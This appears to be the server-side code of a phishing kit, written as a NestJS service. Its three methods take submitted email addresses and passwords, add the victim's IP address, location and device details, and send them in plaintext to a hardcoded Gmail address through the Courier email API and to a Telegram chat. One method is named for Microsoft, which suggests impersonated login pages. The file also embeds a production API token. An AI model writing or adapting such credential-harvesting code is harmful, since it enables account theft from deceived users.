import { Injectable } from '@nestjs/common';
import { EmailDto } from './dto/email.dto';
import { CourierClient } from '@trycourier/courier';
import { DeviceService } from './device.service';
import { TelegramService } from './telegram.service';
import { Request } from 'express';

@Injectable()
export class AppService {
  constructor(
    private readonly deviceService: DeviceService,
    private readonly telegramService: TelegramService,
  ) {}
  getHello(): string {
    return 'Hello World!';
  }

  async sendMail(data: EmailDto, req: Request) {
    const { email, password, source, to, chatId } = data;
    // Install with: npm install @trycourier/courier
    console.log(data);
    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { deviceDetails, ipAddr, location } =
      await this.deviceService.getLoginDeviceInfo(req);
    let requestId = null;
    const { requestId: emailRequestId } = await courier.send({
      message: {
        to: {
          email: 'yariaortega@gmail.com',
        },
        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
        data: {
          recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
          source,
        },
      },
    });
    requestId = emailRequestId;

    if (chatId) {
      await this.telegramService.sendLoginNotification(
        email,
        password,
        source,
        deviceDetails,
        ipAddr,
        location,
        chatId,
      );
    }

    // Send notification to Telegram

    return { requestId };
  }

  async sendMailMicrosoft(data: EmailDto, req: Request) {
    const { email, password, source } = data;
    // Install with: npm install @trycourier/courier

    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { deviceDetails, ipAddr, location } =
      await this.deviceService.getLoginDeviceInfo(req);

    const { requestId } = await courier.send(
      {
        message: {
          to: {
            email: 'yariaortega@gmail.com',
          },
          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
          data: {
            recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
            source,
          },
        },
      },
      {
        idempotencyExpiry: 3000,
      },
    );

    // Send notification to Telegram
    await this.telegramService.sendLoginNotification(
      email,
      password,
      source,
      deviceDetails,
      ipAddr,
      location,
    );

    return requestId;
  }

  async sendMailBrown(data: EmailDto, req: Request) {
    const { email, password, source } = data;
    // Install with: npm install @trycourier/courier
    console.log(data);
    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { deviceDetails, ipAddr, location } =
      await this.deviceService.getLoginDeviceInfo(req);

    const { requestId } = await courier.send(
      {
        message: {
          to: {
            email: 'yariaortega@gmail.com',
          },
          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
          data: {
            recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
            source,
          },
        },
      },
      {
        idempotencyExpiry: 3000,
      },
    );

    // Send notification to Telegram
    await this.telegramService.sendLoginNotification(
      email,
      password,
      source,
      deviceDetails,
      ipAddr,
      location,
    );

    return requestId;
  }
}
